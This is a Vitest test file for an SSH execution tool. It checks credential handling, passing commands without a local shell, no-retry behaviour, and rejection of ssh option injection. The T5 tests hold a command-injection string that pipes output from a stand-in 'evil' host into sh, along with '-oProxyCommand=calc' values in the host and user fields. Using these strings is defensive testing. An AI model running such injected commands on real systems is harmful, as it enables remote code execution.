import { beforeEach, afterEach, describe, expect, it, vi } from 'vitest'
import { mkdirSync, readFileSync, rmSync } from 'node:fs'
import { join } from 'node:path'
import { executeSSH } from './ssh-tool.js'
import { saveHosts } from './ssh-tool-hosts.js'

const { execute } = vi.hoisted(() => ({ execute: vi.fn(() => 'fixture-host\n') }))
vi.mock('node:child_process', () => ({ execSync: execute, execFileSync: execute, spawnSync: vi.fn() }))
vi.mock('../core/environment.js', () => ({ detectEnvironment: () => ({
    os: 'linux', hasSSH: true, hasPlink: false, hasSshpass: true, hasSSHKey: true, sshKeyPath: '/fixture/key',
}), autoInstall: vi.fn(() => false) }))
const file = join(process.cwd(), '.nova-data', 'hosts.json')
beforeEach(() => { execute.mockClear(); mkdirSync(join(process.cwd(), '.nova-data'), { recursive: true }); rmSync(file, { force: true }) })
afterEach(() => vi.unstubAllEnvs())

describe('SSH authentication and metadata persistence (mocked process, no SSH)', () => {
    it('does not turn a successful password connection into plaintext credential storage', async () => {
        const result = await executeSSH({ host: '192.0.2.10', command: 'hostname', user: 'operator', password: 'fixture-only-secret' })
        expect(result.success).toBe(true)
        expect(execute).toHaveBeenCalledTimes(1)
        const saved = readFileSync(file, 'utf8')
        expect(saved).toContain('fixture-host')
        expect(saved).not.toContain('fixture-only-secret')
        expect(JSON.parse(saved).hosts[0].password).toBeUndefined()
    })
    it('fails explicitly for a missing reference but permits explicit key authentication', async () => {
        vi.stubEnv('XAVENTRA_SSH_MISSING', '')
        saveHosts({ hosts: [{ name: 'worker', alias: [], ip: '192.0.2.10', user: 'operator', passwordEnv: 'XAVENTRA_SSH_MISSING', description: '', lastSeen: null }] })
        const denied = await executeSSH({ host: 'worker', command: 'hostname' })
        expect(denied.success).toBe(false)
        expect(execute).not.toHaveBeenCalled()
        const key = await executeSSH({ host: 'worker', command: 'hostname', password: 'ssh-key' })
        expect(key.success).toBe(true)
        expect(execute).toHaveBeenCalledTimes(1)
        expect(execute.mock.calls[0][0]).not.toContain('sshpass')
        expect(execute.mock.calls[0][1]).not.toContain('sshpass')
    })
})

describe('R2 T3/T4/T5/T29/T30: SSH runs without a local shell and never re-runs failed remote commands', () => {
    it('T5: passes the remote command as one argument, without a local shell, password only via environment', async () => {
        const result = await executeSSH({ host: '192.0.2.10', command: 'ls $(curl evil/x|sh) `id` $HOME', user: 'operator', password: 'fixture-only-secret' })
        expect(result.success).toBe(true)
        const [file, args, options] = execute.mock.calls[0] as any
        expect(file).toBe('sshpass')
        expect(args).toContain('ls $(curl evil/x|sh) `id` $HOME')
        expect(args.join(' ')).not.toContain('fixture-only-secret')
        expect(options.shell).toBeUndefined()
        expect(options.env.SSHPASS).toBe('fixture-only-secret')
        expect(JSON.stringify(result)).not.toContain('fixture-only-secret')
    })
    it('T5: rejects host and user values that would become ssh options', async () => {
        for (const params of [{ host: '-oProxyCommand=calc', user: 'op' }, { host: '192.0.2.10', user: '-oProxyCommand=calc' }, { host: '192.0.2.10', user: 'a b' }]) {
            const result = await executeSSH({ ...params, command: 'id', password: 'ssh-key' })
            expect(result.success).toBe(false)
        }
        expect(execute).not.toHaveBeenCalled()
    })
    it('T3: a non-zero remote exit is returned once with its output, no retry, no install, no key upload', async () => {
        execute.mockImplementationOnce(() => { throw Object.assign(new Error('Command failed'), { status: 1, stdout: 'partial\n', stderr: 'grep: no match\n' }) })
        const result = await executeSSH({ host: '192.0.2.10', command: 'echo x >> f; grep y f', user: 'operator', password: 'fixture-only-secret' })
        expect(result.success).toBe(false)
        expect(result.output).toContain('partial')
        expect(result.error).toMatch(/Exit-Code 1/)
        expect(execute).toHaveBeenCalledTimes(1)
    })
    it('T3: output that merely contains "not found" is a normal success, not a retry trigger', async () => {
        execute.mockImplementationOnce(() => 'HTTP 404 not found\n')
        const result = await executeSSH({ host: '192.0.2.10', command: 'curl -s http://x/y', user: 'operator', password: 'ssh-key' })
        expect(result.success).toBe(true)
        expect(execute).toHaveBeenCalledTimes(1)
    })
    it('T3: a connection failure does not install tools or upload a key without approval', async () => {
        const { autoInstall } = await import('../core/environment.js')
        execute.mockImplementation(() => { throw Object.assign(new Error('Connection refused'), { status: 255 }) })
        const result = await executeSSH({ host: '192.0.2.10', command: 'id', user: 'operator', password: 'fixture-only-secret' })
        execute.mockImplementation(() => 'fixture-host\n')
        expect(result.success).toBeFalsy()
        expect(autoInstall).not.toHaveBeenCalled()
        expect(execute.mock.calls.every(call => call[0] !== 'ssh-keygen')).toBe(true)
        expect(execute).toHaveBeenCalledTimes(2) // sshpass, key
    })
    it('T29: the background wrapper detaches its stdio from the SSH channel', async () => {
        await executeSSH({ host: '192.0.2.10', command: 'apt install -y foo', user: 'operator', password: 'ssh-key' })
        const args = execute.mock.calls[0][1] as string[]
        expect(args[args.length - 1]).toMatch(/> \/dev\/null 2>&1 < \/dev\/null &$/)
    })
    it('T4: an explicit user is not overwritten by a known host entry', async () => {
        saveHosts({ hosts: [{ name: 'worker', alias: [], ip: '192.0.2.10', user: 'operator', description: '', lastSeen: null }] })
        await executeSSH({ host: 'worker', command: 'id', user: 'backup', password: 'ssh-key' })
        expect((execute.mock.calls[0][1] as string[])).toContain('backup@192.0.2.10')
    })
})
